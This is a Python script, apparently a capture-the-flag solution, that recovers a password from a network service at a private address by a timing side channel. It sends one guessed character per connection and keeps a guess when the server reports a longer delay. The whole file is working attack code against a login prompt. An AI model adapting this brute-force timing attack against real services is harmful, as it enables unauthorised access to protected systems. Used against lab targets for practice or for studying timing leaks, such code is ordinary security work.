import socket
import string
import os

# Set server and port number
HOST = "10.21.235.179"
PORT = 5555

# Setup hash constants
PRIME = 19
SEARCH_LETTERS = string.ascii_lowercase+"{}=_"

# start with empty password
current_baseline_password = "-"*PRIME

# find the first PRIME letters of the password
# rest of the letters do not matter
for i in range(PRIME):
    for letter in SEARCH_LETTERS:
        # try each character in the search space for the current position
        current_try_password = list(current_baseline_password)
        current_try_password[(7*i+4)%PRIME] = letter
        sent_password = ''.join(current_try_password)
        print("Current try: {}".format(sent_password))
        sent_password += os.linesep
        # Server closes the TCP connection after a single try (Broken Pipe error)
        # Need to create a new socket for each guess.
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT))
            # Set a large timeout to account for large delays for correct password
            sock.settimeout(100)
            prompt = sock.recv(1024)
            # Check if response received from server is as expected
            if prompt.strip() == b"Enter the password:":
                sock.send(bytes(sent_password, "UTF-8"))
                response = sock.recv(1024)
                # Python hackism to extract the float number
                time_taken = float(str(response).split("=  ")[1].split("\\n")[0])
                # Incorrect guess for ith position - i+1 sec
                # Correct guess for ith position - i+2 sec
                if time_taken > i+2:
                    current_baseline_password = sent_password.strip()
                    break
            sock.close()
